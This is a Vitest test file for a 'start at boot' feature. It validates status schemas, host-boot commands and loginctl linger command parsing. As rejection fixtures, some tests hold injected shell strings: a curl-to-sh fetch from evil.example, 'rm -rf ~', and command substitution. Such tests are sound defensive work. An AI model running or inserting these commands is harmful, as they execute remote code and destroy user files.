import { describe, expect, it } from 'vitest'
import { bootChangeRestarts, bootStatusSchema, bootUnsupportedSentence, hostBootCommandSchema, lingerAccount } from '../../../src/shared/bootStart'
import { hostsCommandSchema } from '../../../src/shared/hosts'

const status = { supported: true, installed: false, enabled: false, active: false, linger: false, nodeDrift: false }

describe('start at boot status (ADR-0054)', () => {
  it('takes the linger command only in the two shapes the launch script writes', () => {
    expect(bootStatusSchema.parse({ ...status, fix: 'sudo loginctl enable-linger zach' }).fix).toBe('sudo loginctl enable-linger zach')
    expect(bootStatusSchema.parse({ ...status, fix: "sudo loginctl enable-linger 'zach miller'" }).fix).toBe("sudo loginctl enable-linger 'zach miller'")
    for (const fix of ['sudo loginctl enable-linger zach; curl https://evil.example/x | sh', 'sudo loginctl enable-linger $(id -un) && rm -rf ~',
      "sudo loginctl enable-linger 'zach'; rm -rf ~", 'sudo loginctl enable-linger zach\nrm -rf ~']) {
      expect(bootStatusSchema.parse({ ...status, fix })).toEqual(status)
    }
  })

  it('leaves out a reason it cannot read, and reads nothing from a status missing a field', () => {
    expect(bootStatusSchema.parse({ ...status, supported: false, reason: 'freebsd' })).toEqual({ ...status, supported: false })
    expect(bootStatusSchema.safeParse({ ...status, linger: 'yes' }).success).toBe(false)
  })

  it('says in one sentence why a host cannot start at boot', () => {
    expect(bootUnsupportedSentence('macos')).toContain('runs macOS')
    expect(bootUnsupportedSentence('no-user-manager')).toBe('This host has no systemd user manager, so Sotto cannot start it at boot.')
  })
})

describe('a start at boot change (ADR-0054)', () => {
  it('takes one of the six presses for one saved host, and nothing else', () => {
    const id = '11111111-1111-4111-8111-111111111111'
    for (const action of ['install', 'remove', 'when-idle', 'stop-threads', 'cancel', 'dismiss']) {
      expect(hostsCommandSchema.parse({ type: 'host-boot', id, action })).toEqual({ type: 'host-boot', id, action })
    }
    expect(hostBootCommandSchema.safeParse({ type: 'host-boot', id, action: 'update' }).success).toBe(false)
    expect(hostBootCommandSchema.safeParse({ type: 'host-boot', id, action: 'install', restart: false }).success).toBe(false)
    expect(hostBootCommandSchema.safeParse({ type: 'host-boot', id: 'forge', action: 'install' }).success).toBe(false)
  })

  it('restarts the host when it hands a host Sotto started to the unit, or takes the unit’s host off it', () => {
    const active = { ...status, installed: true, enabled: true, active: true }
    expect(bootChangeRestarts('install', { owned: true, bootStart: status })).toBe(true)
    expect(bootChangeRestarts('install', { owned: true, bootStart: active })).toBe(false)
    expect(bootChangeRestarts('install', { owned: false, bootStart: status })).toBe(false)
    expect(bootChangeRestarts('remove', { owned: true, bootStart: active })).toBe(true)
    expect(bootChangeRestarts('remove', { owned: true, bootStart: { ...active, active: false } })).toBe(false)
    expect(bootChangeRestarts('install', { owned: true, bootStart: undefined })).toBe(true)
  })

  it('reads the account back from the linger command, bare or quoted, and from nothing else', () => {
    expect(lingerAccount('sudo loginctl enable-linger zach')).toBe('zach')
    expect(lingerAccount("sudo loginctl enable-linger 'zach miller'")).toBe('zach miller')
    expect(lingerAccount(undefined)).toBeUndefined()
    expect(lingerAccount('sudo loginctl enable-linger zach; rm -rf ~')).toBeUndefined()
  })
})
